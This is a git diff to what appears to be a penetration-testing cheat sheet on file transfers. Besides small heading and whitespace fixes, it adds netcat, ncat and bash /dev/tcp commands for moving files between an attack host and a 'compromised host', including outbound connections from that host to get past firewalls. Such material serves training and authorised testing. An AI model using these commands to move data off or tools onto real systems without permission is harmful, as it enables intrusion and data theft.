@@ -153,7 +153,7 @@ ftp -i -v -n -s:ftpcommand.txt
 </details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;<details>  
-<summary><h2>📥 Uploads</h2></summary>  
+<summary><h2>📤 Uploads</h2></summary>  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h3>PowerShell Uploads</h3></summary>  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
@@ -237,8 +237,8 @@ copy <FILE PATH> \\<IP>\sharefolder\
 ```
 If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
 </details>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
-<summary><h3>FTP Uploads</h3></summary>  
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>FTP Uploads</h3></summary>
 
 **Source Machine: Start our FTP Server in Linux**
 ```bash
@@ -402,7 +402,7 @@ scp user@remote_ip:/remote/path/<FILE> /local/path/
 </details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;<details>  
-<summary><h2>📥 Uploads</h2></summary>
+<summary><h2>📤 Uploads</h2></summary>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>Web Upload</h3></summary>
 
@@ -616,3 +616,77 @@ python3 -c 'import requests;requests.post("http://<IP>:<PORT>/uploads/path/",fil
 </details>
 
 ---
+
+<details>
+<summary><h1>🧰 Miscellaneous</h1></summary>
+&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h2>NC</h2></summary>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Netcat</h3></summary>
+
+**Destination Machine: Listening on Port 8000**
+```bash
+nc -lvnp 8000 > <OUTPUT FILE>
+```
+
+**Source Machine: Sending File**
+```bash
+nc -q 0 <IP> 8000 < <LOCAL FILE>
+```
+
+**Reverse File Transfer (Outbound Connection from Compromised Host)**
+
+Instead of listening on the compromised machine, you can listen on your attack host and have the compromised machine connect out. This is useful when inbound connections are blocked by a firewall.
+
+**Destination Machine: Connects to Source Machine and receives file**
+```bash
+nc <IP> 443 > <OUTPUT FILE>
+```
+
+**Source Machine: Listening and sending file as input to Ncat**
+```bash
+sudo nc -l -p 443 -q 0 < <LOCAL FILE>
+```
+
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Ncat</h3></summary>
+
+**Destination Machine: Listening on Port 8000**
+```bash
+ncat -l -p 8000 --recv-only > <OUTPUT FILE>
+```
+
+**Source Machine: Sending File**
+```bash
+ncat --send-only <IP> 8000 < <LOCAL FILE>
+```
+
+**Reverse File Transfer (Outbound Connection from Compromised Host)**
+
+**Destination Machine: Connects to Source Machine and receives file**
+```bash
+ncat <IP> 443 --recv-only > <OUTPUT FILE>
+```
+
+**Source Machine: Listening and sending file as input to Ncat**
+```bash
+sudo ncat -l -p 443 --send-only < <LOCAL FILE>
+```  
+
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Bash /dev/tcp</h3></summary>
+
+If Netcat or Ncat are not available, Bash can use the pseudo-device `/dev/tcp/host/port` for file transfers.
+
+**Destination Machine: Receive file using /dev/tcp**
+```bash
+cat < /dev/tcp/<IP>/443 > <OUTPUT FILE>
+```
+
+> **Note:** This method can also be used to transfer files from the compromised host to your Source Machine by reversing the direction of the connection.
+
+</details>
+</details>
+</details>
